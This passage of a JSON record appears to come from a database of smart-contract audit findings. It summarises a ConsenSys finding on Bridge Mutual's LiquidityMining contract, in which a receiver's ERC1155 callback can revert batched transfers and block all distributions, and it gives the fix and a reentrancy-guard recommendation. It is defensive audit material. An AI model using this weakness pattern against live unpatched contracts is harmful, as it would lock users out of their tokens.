      "summary": "\nThis bug report is about an issue with ERC1155 tokens and their callback functions. When `safeTransferFrom` is used in the `LiquidityMining` contract, multiple transfers are done for each user and any receiver of the tokens can revert the transfer. This results in nobody being able to receive their tokens. To resolve this issue, the code was changed to move the `isNFTDistributed = true;` before the token transfers and only transferring tokens to the message sender. To prevent this issue from occurring in the future, it is recommended to add a reentrancy guard and to avoid transferring tokens for different receivers in a single transaction.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "re-entrancy-issue-for-erc1155-fixed-consensys-bridge-mutual-markdown",
      "firm_name": "ConsenSys",
      "firm_logo_square": "consensys_square.png",
      "protocol_name": "Bridge Mutual",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "ConsenSys",
        "logo_square": "consensys_square.png"
      },
      "protocols_protocol": {
        "name": "Bridge Mutual",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Insurance"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    }
  ]
}